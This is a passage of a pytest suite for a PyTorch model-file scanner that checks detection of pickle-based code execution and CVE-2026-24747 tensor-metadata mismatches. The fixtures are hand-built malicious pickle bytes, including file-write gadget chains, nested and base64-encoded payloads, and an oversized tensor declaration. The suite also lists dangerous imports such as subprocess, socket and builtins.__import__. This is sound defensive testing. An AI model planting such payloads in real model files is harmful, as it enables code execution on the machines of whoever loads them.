def test_get_installed_pytorch_version_does_not_import_torch(monkeypatch: pytest.MonkeyPatch) -> None:
    """Scanner should not import torch while collecting version context."""
    import builtins
    import sys

    scanner = PyTorchZipScanner()
    real_import = builtins.__import__
    import_calls: list[str] = []

    def fail_torch_import(
        name: str,
        globals: dict[str, object] | None = None,
        locals: dict[str, object] | None = None,
        fromlist: tuple[str, ...] = (),
        level: int = 0,
    ) -> object:
        import_calls.append(name)
        if name == "torch":
            raise RuntimeError("broken torch import")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.delitem(sys.modules, "torch", raising=False)
    monkeypatch.setattr(builtins, "__import__", fail_torch_import)

    assert scanner._get_installed_pytorch_version() is None
    assert "torch" not in import_calls


def test_pytorch_zip_version_detection_uses_local_torch_when_metadata_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Local torch version should be used only as a fallback when metadata is absent."""
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.5.1")

    detected_version, source = scanner._get_detected_pytorch_version({})

    assert detected_version == "2.5.1"
    assert source == "local_environment"


# CVE-2026-24747 Tests


def _create_pytorch_zip_with_framework_version(path: Path, pytorch_version: str) -> Path:
    with zipfile.ZipFile(path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1.0, 2.0, 3.0]}))
        zipf.writestr("config.json", json.dumps({"pytorch_version": pytorch_version}))
    return path


def test_pytorch_zip_cve_2026_24747_version_check(tmp_path: Path) -> None:
    """Model metadata with vulnerable version should trigger CVE-2026-24747."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.9.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))
    cve_2026_checks = [c for c in result.checks if "CVE-2026-24747" in c.name]
    failed_checks = [c for c in cve_2026_checks if c.status == CheckStatus.FAILED]
    assert len(failed_checks) > 0, (
        f"Should flag PyTorch 2.9.0 as vulnerable to CVE-2026-24747. "
        f"Checks: {[(c.name, c.status) for c in result.checks]}"
    )
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.9.0"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"


def test_pytorch_zip_cve_2025_32434_metadata_not_suppressed_by_local_torch(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A fixed local torch install must not hide vulnerable artifact metadata."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.5.1")
    scanner = PyTorchZipScanner()
    monkeypatch.setattr(scanner, "_get_installed_pytorch_version", lambda: "2.6.0")

    result = scanner.scan(str(model_path))

    failed_checks = [
        c for c in result.checks if c.name == "CVE-2025-32434 PyTorch Version Check" and c.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) > 0
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.5.1"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"


def _pickle_result_with_reduce(import_reference: str | None = None) -> ScanResult:
    result = ScanResult(scanner_name="pickle")
    details: dict[str, object] = {"opcode": "REDUCE"}
    if import_reference is not None:
        details["import_reference"] = import_reference
    result.add_check(
        name="Dangerous Pickle Opcode",
        passed=False,
        message="REDUCE opcode detected",
        severity=IssueSeverity.WARNING,
        details=details,
    )
    return result


def _weights_only_analysis_check(result: ScanResult) -> Check:
    return next(check for check in result.checks if check.name == "CVE-2025-32434 Pickle Format Security Analysis")


def _weights_only_analysis_checks_by_member(result: ScanResult) -> dict[str, Check]:
    return {
        str(check.details["pickle_filename"]): check
        for check in result.checks
        if check.name == "CVE-2025-32434 Pickle Format Security Analysis"
        and isinstance(check.details.get("pickle_filename"), str)
    }


def _legacy_s207_pickle_result(opcode_counts: dict[str, int]) -> ScanResult:
    scanner = PickleScanner()
    result = ScanResult(scanner_name="pickle", scanner=scanner)
    result.metadata["opcode_counts"] = opcode_counts
    result.metadata["import_references"] = [
        {
            "import_reference": "__main__.CustomModel",
            "module": "__main__",
            "name": "CustomModel",
            "opcode": "STACK_GLOBAL",
            "position": 42,
            "is_dangerous": False,
        }
    ]
    scanner._add_root_legacy_metadata_detectors(result, "data.pkl")
    assert any(issue.rule_code == "S207" for issue in result.issues)
    return result


@pytest.mark.parametrize(
    ("message", "details", "opcode", "expected_count"),
    [
        ("ignored", {"opcode_name": "BUILD"}, "BUILD", 1),
        ("ignored", {"opcodes": ["OBJ", "OBJ", "REDUCE"]}, "OBJ", 2),
        ("ignored", {"opcode_counts": {"NEWOBJ_EX": 2}}, "NEWOBJ_EX", 2),
        ("Found GLOBAL opcode", {}, "GLOBAL", 1),
        ("Found NEWOBJ_EXTRA opcode", {}, "NEWOBJ", 0),
        ("Found BUILD opcode", {"opcode_counts": {"BUILD": True}}, "BUILD", 0),
    ],
)
def test_pytorch_zip_cve_2025_32434_reads_exact_opcode_evidence(
    message: str,
    details: dict[str, Any],
    opcode: str,
    expected_count: int,
) -> None:
    assert PyTorchZipScanner._issue_pickle_opcode_count(message, details, opcode) == expected_count


def test_pytorch_zip_cve_2025_32434_empty_imports_stay_suspicious(tmp_path: Path) -> None:
    """Dangerous opcodes without import evidence must not be downgraded to INFO."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce()
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.WARNING
    assert check.details["import_analysis"]["all_legitimate"] is False
    assert check.details["import_analysis"]["total_imports"] == 0


def test_pytorch_zip_cve_2025_32434_ignores_opcode_name_substrings_and_prose(tmp_path: Path) -> None:
    pickle_result = _pickle_result_with_reduce("numpy.core.multiarray._reconstruct")
    pickle_result.add_check(
        name="Dangerous Pickle Call Graph",
        passed=False,
        message=(
            "Pickle global 'numpy.core.multiarray._reconstruct' reaches dangerous Python "
            "primitive 'builtins.__import__' through the installed call graph"
        ),
        severity=IssueSeverity.CRITICAL,
        details={
            "import_reference": "numpy.core.multiarray._reconstruct",
            "analysis": "python_call_graph",
        },
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.details["opcode_counts"] == {"REDUCE": 1}
    assert "GLOBAL" not in check.details["unique_opcode_types"]
    assert "INST" not in check.details["unique_opcode_types"]
    assert "OBJ" not in check.details["unique_opcode_types"]


def test_pytorch_zip_cve_2025_32434_does_not_double_count_stack_global(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.add_check(
        name="Dangerous Pickle Opcode",
        passed=False,
        message="STACK_GLOBAL opcode detected",
        severity=IssueSeverity.WARNING,
        details={"opcode": "STACK_GLOBAL"},
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.details["opcode_counts"] == {"STACK_GLOBAL": 1}


def test_pytorch_zip_cve_2025_32434_reports_newobj_ex(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "newobj_ex.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", _malicious_newobj_ex_pickle_payload())

    result = PyTorchZipScanner().scan(str(model_path))

    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.FAILED
    assert check.rule_code == "S204"
    assert check.details["opcode_counts"] == {"STACK_GLOBAL": 1, "NEWOBJ_EX": 1}
    assert check.details["total_dangerous_opcodes"] == 2
    assert set(check.details["unique_opcode_types"]) == {"STACK_GLOBAL", "NEWOBJ_EX"}
    assert "NEWOBJ" not in check.details["unique_opcode_types"]
    assert "OBJ" not in check.details["unique_opcode_types"]


def test_pytorch_zip_cve_2025_32434_retains_supporting_only_opcode_evidence(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.metadata["opcode_counts"] = {"NEWOBJ_EX": 1}
    pickle_result.add_check(
        name="NEWOBJ_EX Opcode Safety Check",
        passed=False,
        message="Found NEWOBJ_EX opcode invoking dangerous global: builtins.compile",
        severity=IssueSeverity.CRITICAL,
        details={
            "opcode": "NEWOBJ_EX",
            "import_reference": "builtins.compile",
            "supporting_rule_code": True,
        },
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.severity == IssueSeverity.CRITICAL
    assert check.details["opcode_counts"] == {"NEWOBJ_EX": 1}


def test_pytorch_zip_cve_2025_32434_correlates_file_write_call_graph_invocations(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.metadata["opcode_counts"] = {"NEWOBJ": 1, "REDUCE": 1}
    pickle_result.metadata["callable_invocations"] = [
        {"import_reference": "click.open_file", "module": "click", "name": "open_file", "opcode": "NEWOBJ"},
        {"import_reference": "click.echo", "module": "click", "name": "echo", "opcode": "REDUCE"},
    ]
    pickle_result.add_check(
        name="Standalone Pickle Finding",
        passed=False,
        message=(
            "Pickle globals 'click.open_file' and 'click.echo' can open and write "
            "attacker-controlled files through the installed call graph"
        ),
        severity=IssueSeverity.CRITICAL,
        details={
            "pickle_rule_code": "DANGEROUS_CALL_GRAPH_FILE_WRITE",
            "module": "click",
            "name": "echo",
            "import_reference": "click.echo",
            "opener_module": "click",
            "opener_name": "open_file",
            "opener_import_reference": "click.open_file",
        },
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 1, "REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_reports_real_file_write_call_graph_invocations(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "file_write.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", b"\x80\x04cclick\nopen_file\n)\x810cclick\necho\n)R.")

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "DANGEROUS_CALL_GRAPH_FILE_WRITE" for issue in result.issues)
    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 1, "REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_reports_nested_execution_opcode_counts(tmp_path: Path) -> None:
    inner = b"\x80\x04cclick\nopen_file\n)\x810cclick\nopen_file\n)\x810cclick\necho\n)R."
    model_path = create_mock_pytorch_zip(tmp_path / "nested_file_write.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", pickle.dumps({"payload": inner}, protocol=4))

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("nested_has_execution_opcode") is True for issue in result.issues)
    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 2, "REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_does_not_correlate_separate_nested_streams(tmp_path: Path) -> None:
    opener = b"\x80\x04cclick\nopen_file\n)\x81."
    writer = b"\x80\x04cclick\necho\n)R."
    model_path = create_mock_pytorch_zip(tmp_path / "separate_nested_streams.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", pickle.dumps({"opener": opener, "writer": writer}, protocol=4))

    result = PyTorchZipScanner().scan(str(model_path))

    assert not any(
        issue.details.get("pickle_rule_code") == "DANGEROUS_CALL_GRAPH_FILE_WRITE" for issue in result.issues
    )
    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 1, "REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_reports_encoded_nested_execution_opcodes(tmp_path: Path) -> None:
    inner = b"\x80\x04cclick\nopen_file\n)\x810cclick\necho\n)R."
    model_path = create_mock_pytorch_zip(tmp_path / "encoded_nested.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", pickle.dumps({"payload": base64.b64encode(inner).decode()}, protocol=4))

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        issue.rule_code == "S601" and issue.details.get("nested_has_execution_opcode") is True
        for issue in result.issues
    )
    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 1, "REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_nested_evidence_does_not_unlock_outer_opcodes(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.metadata["opcode_counts"] = {"STACK_GLOBAL": 1, "REDUCE": 1}
    pickle_result.metadata["nested_opcode_counts"] = {"NEWOBJ": 1}
    pickle_result.add_check(
        name="Standalone Pickle Finding",
        passed=False,
        message="Nested pickle payload detected",
        severity=IssueSeverity.CRITICAL,
        details={"nested_has_execution_opcode": True},
        rule_code="S213",
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 1}


@pytest.mark.parametrize("nested_rule_code", ["S213", "S601"])
def test_pytorch_zip_cve_2025_32434_fails_closed_for_legacy_nested_execution_evidence(
    tmp_path: Path,
    nested_rule_code: str,
) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.add_check(
        name="Standalone Pickle Finding",
        passed=False,
        message="Nested pickle payload detected",
        severity=IssueSeverity.CRITICAL,
        details={"nested_has_execution_opcode": True},
        rule_code=nested_rule_code,
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.rule_code == nested_rule_code
    assert check.details["opcode_counts"] == {}
    assert check.details["nested_execution_opcode_evidence"] is True


def test_pytorch_zip_cve_2025_32434_correlates_callable_singleton_alias(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "callable_alias.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", b"\x80\x04\x8c\x08builtins\x8c\x04help\x93)R.")

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        issue.details.get("pickle_rule_code") == "DANGEROUS_CALL_GRAPH"
        and issue.details.get("invocation_import_reference") == "builtins.help"
        and issue.details.get("opcode") == "REDUCE"
        for issue in result.issues
    )
    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_correlates_all_callable_singleton_alias_invocations(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.metadata["opcode_counts"] = {"NEWOBJ": 1, "REDUCE": 1}
    pickle_result.metadata["callable_invocations"] = [
        {"import_reference": "builtins.help", "opcode": "NEWOBJ"},
        {"import_reference": "builtins.help", "opcode": "REDUCE"},
    ]
    pickle_result.add_check(
        name="Standalone Pickle Finding",
        passed=False,
        message=(
            "Pickle global '_sitebuiltins._Helper.__call__' reaches dangerous Python primitive "
            "'builtins.__import__' through the installed call graph"
        ),
        severity=IssueSeverity.CRITICAL,
        details={
            "import_reference": "_sitebuiltins._Helper.__call__",
            "invocation_import_reference": "builtins.help",
            "opcode": "REDUCE",
        },
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"NEWOBJ": 1, "REDUCE": 1}


def test_pytorch_zip_cve_2025_32434_callable_singleton_import_without_invocation_stays_clean(
    tmp_path: Path,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "callable_alias_import.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", b"\x80\x04\x8c\x08builtins\x8c\x04help\x93.")

    result = PyTorchZipScanner().scan(str(model_path))

    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.PASSED
    assert check.details["dangerous_opcodes_found"] is False


def test_pytorch_zip_cve_2025_32434_file_write_imports_without_invocation_stay_clean(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "file_write_imports.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", b"\x80\x04cclick\nopen_file\ncclick\necho\n\x86.")

    result = PyTorchZipScanner().scan(str(model_path))

    check = _weights_only_analysis_check(result)
    assert check.status == CheckStatus.PASSED
    assert check.details["dangerous_opcodes_found"] is False


def test_pytorch_zip_cve_2025_32434_includes_s207_metadata_build_evidence(tmp_path: Path) -> None:
    pickle_result = _legacy_s207_pickle_result({"STACK_GLOBAL": 1, "BUILD": 1})
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"STACK_GLOBAL": 1, "BUILD": 1}


def test_pytorch_zip_cve_2025_32434_does_not_invent_build_for_s207(tmp_path: Path) -> None:
    pickle_result = _legacy_s207_pickle_result({"STACK_GLOBAL": 1})
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.FAILED
    assert check.details["opcode_counts"] == {"STACK_GLOBAL": 1}


def test_pytorch_zip_cve_2025_32434_ignores_unreported_build_metadata(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.metadata["opcode_counts"] = {"BUILD": 1}
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.PASSED
    assert check.details["dangerous_opcodes_found"] is False


def test_pytorch_zip_cve_2025_32434_ignores_benign_opcode_near_matches(tmp_path: Path) -> None:
    pickle_result = ScanResult(scanner_name="pickle")
    pickle_result.add_check(
        name="Pickle Metadata Diagnostic",
        passed=False,
        message=("Global build analysis reduced an installed object with newobject and stack_globalized metadata"),
        severity=IssueSeverity.INFO,
        details={"analysis": "metadata_diagnostic"},
    )
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    PyTorchZipScanner()._add_weights_only_safety_warnings(
        pickle_result,
        pytorch_result,
        str(tmp_path / "model.pt"),
        "data.pkl",
    )

    check = _weights_only_analysis_check(pytorch_result)
    assert check.status == CheckStatus.PASSED
    assert check.details["dangerous_opcodes_found"] is False


@pytest.mark.parametrize(
    "import_reference",
    [
        "torch._utils.evil",
        "collections.OrderedDictEvil",
        "torch._rebuild_tensor_v2.evil",
        "subprocesssafe.Popen",
        "webbrowsersafe.open",
        "socketed.connect",
    ],
)
def test_pytorch_zip_cve_2025_32434_safe_prefix_spoofing_stays_suspicious(
    tmp_path: Path, import_reference: str
) -> None:
    """Safe-looking prefixes must not count as legitimate imports by substring."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce(import_reference)
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.WARNING
    assert check.details["import_analysis"]["all_legitimate"] is False
    assert import_reference in check.details["import_analysis"]["found_imports"]


@pytest.mark.parametrize(
    "import_reference",
    [
        "torch._utils._rebuild_tensor_v2",
        "torch._rebuild_tensor",
        "torch._rebuild_tensor_v2",
    ],
)
def test_pytorch_zip_cve_2025_32434_known_rebuild_reference_stays_info(tmp_path: Path, import_reference: str) -> None:
    """Known PyTorch rebuild functions remain informational to avoid noisy state-dict results."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce(import_reference)
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.INFO
    assert check.details["import_analysis"]["all_legitimate"] is True


@pytest.mark.parametrize(
    "import_reference",
    [
        "__builtins__.eval",
        "asyncio.subprocess",
        "asyncio.subprocess.create_subprocess_shell",
        "builtins.compile",
        "builtins.__import__",
        "socket",
        "subprocess",
        "urllib",
        "urllib2.urlopen",
        "webbrowser",
    ],
)
def test_pytorch_zip_cve_2025_32434_dangerous_references_stay_critical(tmp_path: Path, import_reference: str) -> None:
    """Dangerous references reported exactly or by known risky prefixes remain malicious."""
    scanner = PyTorchZipScanner()
    pickle_result = _pickle_result_with_reduce(import_reference)
    pytorch_result = ScanResult(scanner_name="pytorch_zip")

    scanner._add_weights_only_safety_warnings(pickle_result, pytorch_result, str(tmp_path / "model.pt"), "data.pkl")

    check = _weights_only_analysis_check(pytorch_result)
    assert check.severity == IssueSeverity.CRITICAL
    assert import_reference in check.details["import_analysis"]["found_malicious"]


def test_pytorch_zip_cve_2026_24747_fixed_version(tmp_path: Path) -> None:
    """Model metadata with fixed version should not trigger CVE-2026-24747."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.10.0")
    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    # Fixed version: CVE-2026-24747 check should be present but not failed
    cve_2026_checks = [c for c in result.checks if "CVE-2026-24747" in c.name]
    assert len(cve_2026_checks) > 0, "Expected CVE-2026-24747 check to be present"
    cve_2026_failed = [c for c in cve_2026_checks if c.status == CheckStatus.FAILED]
    assert len(cve_2026_failed) == 0, (
        f"PyTorch 2.10.0 should NOT trigger CVE-2026-24747. "
        f"Failed checks: {[(c.name, c.message) for c in cve_2026_failed]}"
    )


def test_pytorch_zip_cve_2026_24747_prerelease_fix_version_is_vulnerable(tmp_path: Path) -> None:
    """A prerelease of the fixed PyTorch release should still trigger CVE-2026-24747."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.10.0a0")
    scanner = PyTorchZipScanner()

    result = scanner.scan(str(model_path))

    failed_checks = [
        c for c in result.checks if c.name == "CVE-2026-24747 PyTorch Version Check" and c.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) > 0
    assert failed_checks[0].details.get("detected_pytorch_version") == "2.10.0a0"
    assert failed_checks[0].details.get("pytorch_version_source") == "metadata:config.json:pytorch_version"


def test_pytorch_zip_cve_2026_24747_postfix_prerelease_is_not_vulnerable(tmp_path: Path) -> None:
    """A prerelease after the fixed PyTorch release should not become a false positive."""
    model_path = _create_pytorch_zip_with_framework_version(tmp_path / "model.pt", "2.10.1a1")
    scanner = PyTorchZipScanner()

    result = scanner.scan(str(model_path))

    failed_checks = [
        c for c in result.checks if c.name == "CVE-2026-24747 PyTorch Version Check" and c.status == CheckStatus.FAILED
    ]
    assert len(failed_checks) == 0


def test_pytorch_zip_generic_version_metadata_does_not_trigger_cve_version_checks(tmp_path: Path) -> None:
    """Generic config version keys should not be treated as framework version."""
    model_path = tmp_path / "model.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1.0, 2.0, 3.0]}))
        zipf.writestr("config.json", json.dumps({"version": "0.1.0", "model_type": "bert"}))

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    cve_version_checks = [
        c
        for c in result.checks
        if c.status == CheckStatus.FAILED
        and "PyTorch Version Check" in c.name
        and any(
            cve in c.name
            for cve in [
                "CVE-2025-32434",
                "CVE-2026-24747",
                "CVE-2022-45907",
                "CVE-2024-5480",
                "CVE-2024-48063",
            ]
        )
    ]
    assert len(cve_version_checks) == 0, (
        "Generic metadata version should not trigger framework CVE checks. "
        f"Found: {[(c.name, c.message) for c in cve_version_checks]}"
    )


def test_pytorch_zip_tensor_metadata_validation(tmp_path: Path) -> None:
    """Test tensor metadata consistency validation runs without errors."""
    # Create a PyTorch ZIP model with data blobs
    zip_path = tmp_path / "model_with_data.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        # Simple pickle with a dict
        data = {"weights": [1.0, 2.0, 3.0]}
        zipf.writestr("archive/data.pkl", pickle.dumps(data))
        # Add a data blob
        zipf.writestr("archive/data/0", b"\x00" * 24)  # 6 float32 values

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should complete without crashing (best-effort validation)
    assert result is not None
    # Should not report metadata mismatches for a normal model
    mismatch_checks = [c for c in result.checks if "Tensor Metadata" in c.name and c.status == CheckStatus.FAILED]
    assert len(mismatch_checks) == 0, (
        f"Normal model should not have metadata mismatches. Failed: {[(c.name, c.message) for c in mismatch_checks]}"
    )


def test_pytorch_zip_tensor_metadata_mismatch_detection(tmp_path: Path) -> None:
    """Test that intentionally mismatched tensor metadata is detected.

    Creates a PyTorch ZIP where the pickle declares a tensor requiring more
    storage than the actual blob provides, which is the core CVE-2026-24747
    metadata-mismatch exploitation vector.
    """
    import pickletools
    import struct

    # Build a minimal pickle that references _rebuild_tensor_v2 with a
    # declared element count that wildly exceeds the actual blob size.
    # Protocol 2 GLOBAL opcode referencing torch._utils._rebuild_tensor_v2
    pkl_data = bytearray()
    pkl_data.extend(b"\x80\x02")  # PROTO 2
    pkl_data.extend(b"ctorch._utils\n_rebuild_tensor_v2\n")  # GLOBAL
    # Push storage key "0" as SHORT_BINUNICODE
    pkl_data.extend(b"\x8c\x010")  # SHORT_BINUNICODE "0"
    # Push a large element count (1_000_000) as BININT
    pkl_data.extend(b"J")  # BININT opcode
    pkl_data.extend(struct.pack("<i", 1_000_000))
    pkl_data.extend(b".")  # STOP

    # Verify our pickle is parseable by pickletools
    list(pickletools.genops(bytes(pkl_data)))

    zip_path = tmp_path / "mismatch_model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", bytes(pkl_data))
        # Blob is only 24 bytes but pickle declares 1M elements
        zipf.writestr("archive/data/0", b"\x00" * 24)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    assert result is not None
    mismatch_checks = [c for c in result.checks if "Tensor Metadata" in c.name and c.status == CheckStatus.FAILED]
    assert len(mismatch_checks) > 0, (
        f"Should detect tensor storage size mismatch (24 bytes vs 1M declared elements). "
        f"Checks: {[(c.name, c.status, c.message) for c in result.checks]}"
    )


def test_pytorch_zip_tensor_metadata_parse_failure_fails_closed(tmp_path: Path) -> None:
    """Malformed full-member metadata analysis must not collapse into a clean scan."""
    zip_path = tmp_path / "malformed_tensor_metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", b"\x80\x02B")
        zipf.writestr("archive/data/0", b"\x00" * 24)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_tensor_metadata_validation_failed" in result.metadata["scan_outcome_reasons"]
    validation_checks = [check for check in result.checks if check.name == "CVE-2026-24747 Tensor Metadata Validation"]
    assert validation_checks
    assert validation_checks[0].message == "Tensor metadata validation could not parse pickle member archive/data.pkl"


def test_pytorch_zip_tensor_metadata_prefix_truncation_fails_closed(tmp_path: Path) -> None:
    """Late tensor metadata after the bounded validation prefix must not report clean coverage."""
    max_pkl_read = 10 * 1024 * 1024
    pkl_data = bytearray()
    pkl_data.extend(b"\x80\x02")  # PROTO 2
    payload = b"A" * (max_pkl_read + 1024)
    pkl_data.extend(b"B")  # BINBYTES
    pkl_data.extend(struct.pack("<I", len(payload)))
    pkl_data.extend(payload)
    pkl_data.extend(b"0")  # POP
    pkl_data.extend(b"ctorch._utils\n_rebuild_tensor_v2\n")
    pkl_data.extend(b"\x8c\x010")
    pkl_data.extend(b"J")
    pkl_data.extend(struct.pack("<i", 1_000_000))
    pkl_data.extend(b".")

    scanner = PyTorchZipScanner()
    mismatches, parse_complete = scanner._check_tensor_storage_mismatches(bytes(pkl_data), {"archive/data/0": 24})
